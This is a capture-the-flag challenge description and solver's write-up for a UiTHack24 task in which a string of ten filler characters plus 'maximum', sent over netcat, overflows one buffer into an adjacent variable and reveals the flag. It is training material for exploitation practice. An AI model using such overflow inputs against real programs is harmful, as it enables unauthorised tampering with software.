# Radiation Shield

Deep within the space station "Pandora", a looming solar flare threatens the lives of the station's crew. The crew is locked out of the radiation shield controls, so you must hack into the system to increase the shield's protection to `maximum`.

`nc uithack.td.org.uit.no 9000`

[⬇️ shield.c](./shield.c) [⬇️ shield](./shield) [⬇️ libc.so.6](./libc.so.6)

# Writeup

The goal here seems to get the `shield_level` to `maximum`. When that is reached we print the flag. It asks for a input from me with `fgets` and asks for 10 bytes. But both the `shield_status` and `shield_level` are 10 bytes long.

It seems like a buffer overflow situation. When `shield_status` is the one we are writing into after 10 bytes we'll overwrite the `shield_level`. So basically send 10 characters then the value `maximum` and we should get the flag.


```bash
$ nc uithack.td.org.uit.no 9000
New shield status:
1111111111maximum
Shield status: 1111111111maximum

Shield level: maximum

UiTHack24{M4ximum_sh13ld_0verflooow}
```